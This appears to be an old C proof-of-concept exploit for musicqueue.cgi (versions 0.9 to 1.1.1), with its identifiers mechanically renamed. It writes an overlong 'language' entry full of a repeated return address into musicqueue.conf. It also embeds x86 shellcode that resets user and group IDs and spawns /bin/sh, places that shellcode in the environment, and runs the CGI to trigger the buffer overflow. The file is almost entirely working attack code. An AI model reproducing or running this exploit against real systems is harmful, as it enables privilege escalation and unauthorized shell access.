
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int atck_d ;
typedef int FILE ;


 int FUNC_0 (char*,char*,int *,char**) ;
 int FUNC_1 (int) ;
 int FUNC_2 (int *) ;
 int * FUNC_3 (char*,char*) ;
 int FUNC_4 (int *,char*,...) ;
 int FUNC_5 (char*,int ,int) ;
 int VAR_0 ;
 int * VAR_1 ;
 unsigned long FUNC_6 (char*) ;

int FUNC_7(int VAR_2,char *VAR_3[])
{
 FILE *VAR_4;
 int VAR_5=0;
 char *VAR_6[3],VAR_7[0x82];
 char VAR_8[]=
  "\220@\220@\220@\220@\220@\220@\220@\220@\220@"
  "\220@\220@\220@\220@\220@\220@\220@\220@\220@"
  "1\300\260F1\3331\311\315\2001\300\260G1\3331"
  "\311\315\200\353\037^\211v\b1\300\210F\007"
  "\211F\f\260\013\211\363\215N\b\215V\f\315\2001"
  "\333\211\330@\315\200\350\334\377\377\377"
  "/bin/sh";

 unsigned long VAR_9=(0xbfffffff-(FUNC_6(VAR_8)));
 FUNC_5((char *)VAR_7,0,sizeof(VAR_7));

 FUNC_4(VAR_1,"\n 0x82-musicqueue_over - musicqueue.cgi v-0.9~1.1.1 POC exploit.\n\n");

 if(VAR_2<2)
 {
  FUNC_4(VAR_1," Usage: %s [musicqueue.cgi path]\n\n",VAR_3[0]);
  FUNC_1(-1);
 }
 else VAR_9-=(FUNC_6(VAR_3[1]));

 VAR_7[VAR_5++]=0x82;
 for(;VAR_5<44;VAR_5+=4)
 {
  *(long *)&VAR_7[VAR_5]=VAR_9;
 }

 if((VAR_4=FUNC_3("musicqueue.conf","w"))==((void*)0))
 {
 FUNC_4(&VAR_0," [-] musicqueue.conf fopen() error.\n\n");
 return(-1);
 }
 FUNC_4(VAR_4,"language = %s\n",VAR_7);
 FUNC_2(VAR_4);

 VAR_6[0]="REQUEST_METHOD=GET";
 VAR_6[1]=(VAR_8);
 VAR_6[2]=(((void*)0));
 FUNC_0(VAR_3[1],"musicqueue.cgi",((void*)0),VAR_6);
}
